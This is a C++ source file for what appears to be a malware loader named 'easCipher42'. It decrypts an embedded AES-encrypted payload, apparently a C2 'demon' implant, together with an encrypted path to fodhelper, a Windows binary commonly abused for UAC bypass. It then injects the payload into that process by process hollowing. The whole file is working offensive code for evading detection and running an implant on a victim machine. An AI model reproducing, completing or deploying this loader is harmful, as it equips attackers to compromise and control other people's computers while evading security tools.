#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include "easCipher42.hpp"
#include "crypto_funcs.hpp"
#include "process_hollower.hpp"
#include "demon.x64.h"

bool verbose = false;
bool do_hollow = false;

void print_usage(const char* prog) {
    std::cout << "Usage: " << prog << " [OPTIONS]\n";
    std::cout << "  -v, --verbose      Enable debug output\n";
    std::cout << "  -h, --hollow       Execute process hollowing\n";
}

int main(int argc, char* argv[]) {
    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (std::strcmp(argv[i], "-v") == 0 || std::strcmp(argv[i], "--verbose") == 0) {
            verbose = true;
        } else if (std::strcmp(argv[i], "-h") == 0 || std::strcmp(argv[i], "--hollow") == 0) {
            do_hollow = true;
        } else {
            print_usage(argv[0]);
            return 1;
        }
    }

    if (verbose) std::cout << "=== easCipher42 LOADER ===\n";

    // Affichage myenc.py style
    if (verbose) {
        std::cout << "[+] payload_enc: " << payload_enc_len << "b [";
        std::cout << bytes_to_hex(payload_enc, 8) << "..." << bytes_to_hex(payload_enc + payload_enc_len - 8, 8) << "]\n";

        std::cout << "[+] fodhelper_enc: " << fodhelper_enc_len << "b [";
        std::cout << bytes_to_hex(fodhelper_enc, 8) << "..." << bytes_to_hex(fodhelper_enc + fodhelper_enc_len - 8, 8) << "]\n\n";
    }

    // 1. Extraire seed → derive key/iv/salt
    easCipher42 cipher;
    if (!cipher.Init(payload_enc, payload_enc_len)) {
        std::cout << "[-] Init FAILED\n"; return -1;
    }

    // Logs comme myenc.py
    if (verbose) {
        std::cout << "[+] seed (42 bytes): " << bytes_to_hex(cipher.GetSeed(), 42) << "\n";
        std::cout << "[+] salt (dyn): " << bytes_to_hex(cipher.GetSalt(), 16) << "\n";
        std::cout << "[+] key (aes256): " << bytes_to_hex(cipher.GetKey(), 32) << "\n";
        std::cout << "[+] iv (cbc): " << bytes_to_hex(cipher.GetIV(), 16) << "\n\n";
    }

    // 2. Decrypt fodhelper
    std::vector<uint8_t> fodpath;
    if (cipher.Decrypt(fodhelper_enc, fodhelper_enc_len, fodpath)) {
        if (verbose) {
            std::cout << "[+] fodhelper PATH: ";
            for (auto c : fodpath) std::cout << (char)c;
            std::cout << "\n";
        }
    } else {
        std::cout << "[-] FODHELPER FAILED\n";
        return -1;
    }

    // 3. Decrypt payload
    std::vector<uint8_t> payload;
    if (cipher.Decrypt(cipher.GetPayloadEncCiphertext(), cipher.GetPayloadEncCiphertextLen(), payload)) {
        if (verbose) {
            std::cout << "[+] payload decrypted: " << payload.size() << " bytes\n";
            std::cout << "[+] payload header: " << bytes_to_hex(payload.data(), 16) << "\n";
        }
    } else {
        std::cout << "[-] PAYLOAD DECRYPT FAILED\n";
        return -1;
    }

    // 4. Process hollowing if enabled
    if (do_hollow) {
        if (verbose) std::cout << "[*] Starting process hollowing...\n";

        // Convert ASCII path to wide-char using MultiByteToWideChar
        std::string path_str;
        for (auto c : fodpath) {
            if (c == '\0') break;
            path_str += (char)c;
        }

        int wide_size = MultiByteToWideChar(CP_ACP, 0, path_str.c_str(), -1, nullptr, 0);
        std::wstring wide_path(wide_size, 0);
        MultiByteToWideChar(CP_ACP, 0, path_str.c_str(), -1, &wide_path[0], wide_size);

        ProcessHollower hollower;
        if (hollower.HollowProcess(wide_path.c_str(), payload)) {
            std::cout << "[+] Hollowing SUCCESS\n";
        } else {
            std::cout << "[-] Hollowing FAILED\n";
            return -1;
        }
    } else if (verbose) {
        std::cout << "[*] Skipping hollowing (use -h to enable)\n";
    }

    return 0;
}
